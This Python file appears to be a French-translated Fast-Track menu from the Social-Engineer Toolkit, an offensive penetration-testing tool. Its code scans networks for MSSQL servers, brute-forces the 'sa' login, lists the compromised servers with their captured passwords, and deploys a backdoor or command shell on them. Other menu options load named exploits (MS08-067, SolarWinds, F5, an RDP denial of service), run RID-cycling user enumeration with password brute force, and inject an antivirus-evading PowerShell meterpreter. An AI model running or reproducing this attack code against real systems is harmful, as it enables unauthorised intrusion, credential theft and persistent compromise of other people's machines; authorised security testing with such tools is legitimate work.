#!/usr/bin/env python
from src.core.setcore import *
from src.core.menu import text
import subprocess
from multiprocessing.dummy import Pool as ThreadPool 
definepath = os.getcwd()

try: input = raw_input
except: pass

#
#
# Fast-Track Main options and interface menus
#
#
try:
    while 1:
        #
        # USER INPUT: SHOW WEB ATTACK MENU         #
        #

        create_menu(text.fasttrack_text, text.fasttrack_menu)
        attack_vector = raw_input(setprompt(["19"], ""))

        if attack_vector == "99" or attack_vector == "quit" or attack_vector == "exit":
            break

        #
        #
        # mssql_scanner
        #
        #
        if attack_vector == "1":
            # start the menu
            create_menu(text.fasttrack_mssql_text1, text.fasttrack_mssql_menu1)
            # take input here
            attack_vector_sql = raw_input(setprompt(["19", "21"], ""))

            #
            # option 1 scan and attack, option 2 connect directly to mssql
            # if 1, start scan and attack
            #
            if attack_vector_sql == '1':
                print(
                    "\nVous pouvez ici sélectionner soit une notation CIDR/adresse IP, soit un nom de fichier\ncontenant une liste d'adresses IP.\n\nLe format d'un fichier ressemblerait à ceci :\n\n192.168.13.25\n192.168.13.26\n192.168.13.26\n\n1. Scanner une adresse IP ou un CIDR\n2. Importer un fichier contenant des adresses IP de serveurs SQL\n")
                choice = raw_input(
                    setprompt(["19", "21", "22"], "Entrez votre choix (ex. 1 ou 2) [1]"))
                if choice != "1":
                    if choice != "2":
                        if choice != "":
                            print_error(
                                "Vous n'avez pas indiqué 1 ou 2 ! Veuillez réessayer.")
                            choice = raw_input(
                                setprompt(["19", "21", "22"], "Entrez votre choix (ex. 1 ou 2) [1]"))
                # grab ip address
                if choice == "":
                    choice = "1"
                if choice == "1":
                    range = raw_input(setprompt(
                        ["19", "21", "22"], "Entrez le CIDR, une IP unique, ou plusieurs IP séparées par des espaces (ex. 192.168.1.1/24)"))
                if choice == "2":
                    while 1:
                        range = raw_input(setprompt(
                            ["19", "21", "22"], "Entrez le nom du fichier des serveurs SQL (ex. /root/sql.txt - peut être au format ipaddr:port)"))
                        if not os.path.isfile(range):
                            print_error(
                                "Fichier introuvable ! Veuillez saisir correctement le chemin du fichier.")
                        else:
                            break
                if choice == "1":
                    port = "1433"
                if choice == "2":
                    port = "1433"
                # ask for a wordlist
                wordlist = raw_input(setprompt(
                    ["19", "21", "22"], "Entrez le chemin vers un fichier de liste de mots [liste par défaut]"))
                if wordlist == "":
                    wordlist = "default"
                # specify the user to brute force
                username = raw_input(setprompt(
                    ["19", "21", "22"], "Entrez le nom d'utilisateur à forcer ou indiquez un fichier d'utilisateurs (/root/users.txt) [sa]"))
                # default to sa
                if username == "":
                    username = "sa"
                if username != "sa":
                    if not os.path.isfile(username):
                        print_status(
                            "Si vous utilisiez un fichier, il n'a pas été trouvé ; utilisation du texte comme nom d'utilisateur.")
                # import the mssql module from fasttrack
                from src.fasttrack import mssql
                # choice from earlier if we want to use a filelist or whatnot
                if choice != "2":
                    # sql_servers
                    sql_servers = ''
                    print_status("Recherche de serveurs SQL... Cela peut prendre un petit moment.")
                    if "/" or " " in str(range):
                        if "/" in str(range):
                            iprange = printCIDR(range)
                            iprange = iprange.split(",")
                            pool = ThreadPool(200)
                            sqlport = pool.map(get_sql_port, iprange)
                            pool.close()
                            pool.join()
                            for sql in sqlport:
                                if sql != None:
                                    if sql != "":
                                        sql_servers = sql_servers + sql + ","

                        else:
                            range1 = range.split(" ")
                            for ip in range1:
                                sqlport = get_sql_port(ip)
                                if sqlport != None:
                                    if sqlport != "":
                                        sql_servers = sql_servers + sqlport + ","

                    else:
                        # use udp discovery to get the SQL server UDP 1434
                        sqlport = get_sql_port(range)
                        # if its not closed then check nmap - if both fail then
                        # nada
                        if sqlport != None:
                            if sqlport != "":
                                sql_servers = sqlport + ","

                # specify choice 2
                if choice == "2":
                    if not os.path.isfile(range):
                        while 1:
                            print_warning(
                                "Désolé chef. Le fichier n'a pas été trouvé. Réessayez")
                            range = raw_input(setprompt(
                                ["19", "21", "22"], "Entrez le CIDR, une IP unique, ou un fichier d'adresses IP (ex. 192.168.1.1/24)"))
                            if os.path.isfile(range):
                                print_status(
                                    "Bien joué. Le fichier a été trouvé cette fois. On continue.")
                                break

                    fileopen = open(range, "r").readlines()
                    sql_servers = ""
                    for line in fileopen:
                        line = line.rstrip()
                        sql_servers = sql_servers + line + ","

                # this will hold all of the SQL servers eventually
                master_list = ""
                # set a base counter
                counter = 0
                # if we specified a username list
                if os.path.isfile(username):
                    usernames = open(username, "r")

                if sql_servers != False:
                    # get rid of extra data from port scanner
                    sql_servers = sql_servers.replace(":%s OPEN" % (port), "")
                    # split into tuple for different IP address
                    sql_servers = sql_servers.split(",")
                    # start loop and brute force

                    print_status("Les serveurs SQL suivants et leurs ports associés ont été identifiés :\n")
                    for sql in sql_servers:
                        if sql != "":
                            print(sql)

                    if len(sql_servers) > 2:
                        print_status("En appuyant sur entrée, vous démarrerez le bruteforce sur tous les comptes SQL identifiés dans la liste ci-dessus.")
                        test = input("Appuyez sur {entrée} pour démarrer le bruteforce.")
                    for servers in sql_servers:

                        # this will return the following format ipaddr + "," +
                        # username + "," + str(port) + "," + passwords
                        if servers != "":
                            # if we aren't using a username file
                            if not os.path.isfile(username):
                                sql_success = mssql.brute(
                                    servers, username, port, wordlist)
                                if sql_success != False:
                                # after each success or fail it will break
                                # into this to the above with a newline to
                                # be parsed later
                                    master_list = master_list + \
                                        sql_success + ":"
                                    counter = 1

                            # if we specified a username list
                            if os.path.isfile(username):
                                for users in usernames:
                                    users = users.rstrip()
                                    sql_success = mssql.brute(
                                        servers, users, port, wordlist)
                                    # we wont break out of the loop here incase
                                    # theres multiple usernames we want to find
                                    if sql_success != False:
                                        master_list = master_list + \
                                            sql_success + ":"
                                        counter = 1

                # if we didn't successful attack one
                if counter == 0:
                    if sql_servers:
                        print_warning(
                            "Désolé. Impossible de localiser ou de compromettre entièrement un serveur MSSQL parmi les serveurs SQL suivants : ")

                    else:
                        print_warning(
                            "Désolé. Aucun serveur SQL à attaquer n'a été trouvé.")
                    pause = raw_input(
                        "Appuyez sur {entrée} pour revenir au menu principal.")
                # if we successfully attacked one
                if counter == 1:
                    # need to loop to keep menu going
                    while 1:
                        # set a counter to show compromised servers
                        counter = 1
                        # here we list the servers we compromised
                        master_names = master_list.split(":")
                        print_status(
                            "SET Fast-Track a attaqué les serveurs SQL suivants : ")
                        for line in sql_servers:
                            if line != "":
                                print("SQL Servers: " + line.rstrip())
                        print_status(
                            "Voici les systèmes compromis avec succès.\nSélectionnez le serveur SQL compromis avec lequel vous voulez interagir :\n")
                        for success in master_names:
                            if success != "":
                                success = success.rstrip()
                                success = success.split(",")
                                success = bcolors.BOLD + success[0] + bcolors.ENDC + "   username: " + bcolors.BOLD + "%s" % (success[1]) + bcolors.ENDC + " | password: " + bcolors.BOLD + "%s" % (success[
                                    3]) + bcolors.ENDC + "   SQLPort: " + bcolors.BOLD + "%s" % (success[2]) + bcolors.ENDC
                                print("   " + str(counter) + ". " + success)
                                # increment counter
                                counter = counter + 1

                        print("\n   99. Retour au menu principal.\n")
                        # select the server to interact with
                        select_server = raw_input(
                            setprompt(["19", "21", "22"], "Sélectionnez le serveur SQL avec lequel interagir [1]"))
                        # default 1
                        if select_server == "quit" or select_server == "exit":
                            break
                        if select_server == "":
                            select_server = "1"
                        if select_server == "99":
                            break
                        counter = 1
                        for success in master_names:
                            if success != "":
                                success = success.rstrip()
                                success = success.split(",")
                                # if we equal the number used above
                                if counter == int(select_server):
                                # ipaddr + "," + username + "," + str(port) +
                                # "," + passwords
                                    print(
                                        "\nComment voulez-vous déployer le binaire : via debug (win2k, winxp, win2003) et/ou powershell (vista, win7, 2008, 2012), ou juste un shell\n\n   1. Déployer une porte dérobée sur le système\n   2. Shell Windows standard\n\n   99. Retour au menu principal.\n")
                                    option = raw_input(
                                        setprompt(["19", "21", "22"], "Quelle option de déploiement voulez-vous [1]"))
                                    if option == "":
                                        option = "1"
                                    # if 99 then break
                                    if option == "99":
                                        break
                                    # specify we are using the fasttrack
                                    # option, this disables some features
                                    filewrite = open(
                                        userconfigpath + "fasttrack.options", "w")
                                    filewrite.write("none")
                                    filewrite.close()
                                    # import fasttrack
                                    if option == "1":
                                        # import payloads for selection and
                                        # prep
                                        mssql.deploy_hex2binary(
                                            success[0], success[2], success[1], success[3])
                                    # straight up connect
                                    if option == "2":
                                        mssql.cmdshell(success[0], success[2], success[
                                                       1], success[3], option)
                                # increment counter
                                counter = counter + 1

            #
            # if we want to connect directly to a SQL server
            #
            if attack_vector_sql == "2":
                sql_server = raw_input(setprompt(
                    ["19", "21", "23"], "Entrez le nom d'hôte ou l'adresse IP du serveur SQL"))
                sql_port = raw_input(
                    setprompt(["19", "21", "23"], "Entrez le port SQL de connexion [1433]"))
                if sql_port == "":
                    sql_port = "1433"
                sql_username = raw_input(
                    setprompt(["19", "21", "23"], "Entrez le nom d'utilisateur du serveur SQL [sa]"))
                # default to sa
                if sql_username == "":
                    sql_username = "sa"
                sql_password = raw_input(
                    setprompt(["19", "21", "23"], "Entrez le mot de passe du serveur SQL"))
                print_status("Connexion au serveur SQL...")
                # try connecting
                # establish base counter for connection
                counter = 0
                try:
                    import _mssql
                    conn = _mssql.connect(
                        sql_server + ":" + str(sql_port), sql_username, sql_password)
                    counter = 1
                except Exception as e:
                    print(e)
                    print_error("La connexion au serveur SQL a échoué. Réessayez.")
                # if we had a successful connection
                if counter == 1:
                    print_status(
                        "Ouverture d'un shell SQL. Tapez quit pour sortir.")
                    # loop forever
                    while 1:
                        # enter the sql command
                        sql_shell = raw_input("Entrez votre commande SQL ici : ")
                        if sql_shell == "quit" or sql_shell == "exit":
                            print_status(
                                "Fermeture du shell SQL et retour au menu.")
                            break

                        try:
                            # execute the query
                            sql_query = conn.execute_query(sql_shell)
                            # return results
                            print("\n")
                            for data in conn:
                                data = str(data)
                                data = data.replace("\\n\\t", "\n")
                                data = data.replace("\\n", "\n")
                                data = data.replace("{0: '", "")
                                data = data.replace("'}", "")
                                print(data)
                        except Exception as e:
                            print_warning(
                                "\nSyntaxe incorrecte quelque part. Affichage du message d'erreur : " + str(e))

        #
        #
        # exploits menu
        #
        #
        if attack_vector == "2":
            # start the menu
            create_menu(text.fasttrack_exploits_text1,
                        text.fasttrack_exploits_menu1)
            # enter the exploits menu here
            range = raw_input(
                setprompt(["19", "24"], "Sélectionnez le numéro de l'exploit que vous voulez"))

            # ms08067
            if range == "1":
                try:
                    module_reload(src.fasttrack.exploits.ms08067)
                except:
                    import src.fasttrack.exploits.ms08067

            # firefox 3.6.16
            if range == "2":
                try:
                    module_reload(src.fasttrack.exploits.firefox_3_6_16)
                except:
                    import src.fasttrack.exploits.firefox_3_6_16
            # solarwinds
            if range == "3":
                try:
                    module_reload(src.fasttrack.exploits.solarwinds)
                except:
                    import src.fasttrack.exploits.solarwinds

            # rdp DoS
            if range == "4":
                try:
                    module_reload(src.fasttrack.exploits.rdpdos)
                except:
                    import src.fasttrack.exploits.rdpdos

            if range == "5":
                try:
                    module_reload(src.fasttrack.exploits.mysql_bypass)
                except:
                    import src.fasttrack.exploits.mysql_bypass

            if range == "6":
                try:
                    module_reload(src.fasttrack.exploits.f5)
                except:
                    import src.fasttrack.exploits.f5

        #
        #
        # sccm attack menu
        #
        #
        if attack_vector == "3":
            # load sccm attack
            try:
                module_reload(src.fasttrack.sccm.sccm_main)
            except:
                import src.fasttrack.sccm.sccm_main

        #
        #
        # dell drac default credential checker
        #
        #
        if attack_vector == "4":
            # load drac menu
            subprocess.Popen("python %s/src/fasttrack/delldrac.py" %
                             (definepath), shell=True).wait()

        #
        #
        # RID ENUM USER ENUMERATION
        #
        #
        if attack_vector == "5":
            print (r""".______       __   _______         _______ .__   __.  __    __  .___  ___.
|   _  \     |  | |       \       |   ____||  \ |  | |  |  |  | |   \/   |
|  |_)  |    |  | |  .--.  |      |  |__   |   \|  | |  |  |  | |  \  /  |
|      /     |  | |  |  |  |      |   __|  |  . `  | |  |  |  | |  |\/|  |
|  |\  \----.|  | |  '--'  |      |  |____ |  |\   | |  `--'  | |  |  |  |
| _| `._____||__| |_______/  _____|_______||__| \__|  \______/  |__|  |__|
                |______|
""")
            print(
                "\nRID_ENUM est un outil qui énumère les comptes utilisateurs via une attaque de cycling de RID à travers des sessions nulles.\nPour que cela fonctionne, le serveur distant doit avoir les sessions nulles activées. Dans la plupart des cas, on\nutilise ceci contre un contrôleur de domaine lors d'un test d'intrusion interne. Vous n'avez pas besoin de fournir\nd'identifiants, l'outil tentera d'énumérer l'adresse RID de base puis de parcourir de 500 (Administrateur) jusqu'au RID souhaité.")
            print("\n")
            ipaddr = raw_input(
                setprompt(["31"], "Entrez l'adresse IP du serveur (ou quit pour sortir)"))
            if ipaddr == "99" or ipaddr == "quit" or ipaddr == "exit":
                break
            print_status(
                "Vous pouvez ensuite forcer automatiquement les comptes utilisateurs. Si vous ne voulez pas le faire, tapez no à la prochaine invite")
            dict = raw_input(setprompt(
                ["31"], "Entrez le chemin du fichier dictionnaire pour le bruteforce [entrée pour celui intégré]"))
            # if we are using the built in one
            if dict == "":
                # write out a file
                filewrite = open(userconfigpath + "dictionary.txt", "w")
                filewrite.write("\nPassword1\nPassword!\nlc username")
                # specify the path
                dict = userconfigpath + "dictionary.txt"
                filewrite.close()

            # if we are not brute forcing
            if dict.lower() == "no":
                print_status("Aucun problème, pas de bruteforce sur les comptes utilisateurs")
                dict = ""

            if dict != "":
                print_warning(
                    "Vous êtes sur le point de forcer les comptes utilisateurs, attention aux verrouillages de compte.")
                choice = raw_input(
                    setprompt(["31"], "Êtes-vous sûr de vouloir lancer le bruteforce [yes/no]"))
                if choice.lower() == "n" or choice.lower() == "no":
                    print_status(
                        "D'accord. Pas de bruteforce sur les comptes utilisateurs *ouf*.")
                    dict = ""

            # next we see what rid we want to start
            start_rid = raw_input(
                setprompt(["31"], "À quel RID voulez-vous commencer [500]"))
            if start_rid == "":
                start_rid = "500"
            # stop rid
            stop_rid = raw_input(
                setprompt(["31"], "À quel RID voulez-vous arrêter [15000]"))
            if stop_rid == "":
                stop_rid = "15000"
            print_status(
                "Lancement de RID_ENUM pour commencer l'énumération des comptes utilisateurs...")
            subprocess.Popen("python src/fasttrack/ridenum.py %s %s %s %s" %
                             (ipaddr, start_rid, stop_rid, dict), shell=True).wait()

            # once we are finished, prompt.
            print_status("Tout est terminé !")
            pause = raw_input("Appuyez sur {entrée} pour revenir au menu principal.")

        #
        #
        # PSEXEC PowerShell
        #
        #
        if attack_vector == "6":
            print(
                "\nAttaque par injection PowerShell PSEXEC :\n\nCette attaque injecte une porte dérobée meterpreter via une injection mémoire PowerShell. Cela permet de contourner\nl'antivirus puisque le disque n'est jamais touché. Nécessite que PowerShell soit installé sur la machine victime\ndistante. Vous pouvez utiliser soit des mots de passe en clair, soit des valeurs de hash.\n")
            try:
                module_reload(src.fasttrack.psexec)
            except:
                import src.fasttrack.psexec

# handle keyboard exceptions
except KeyboardInterrupt:
    pass
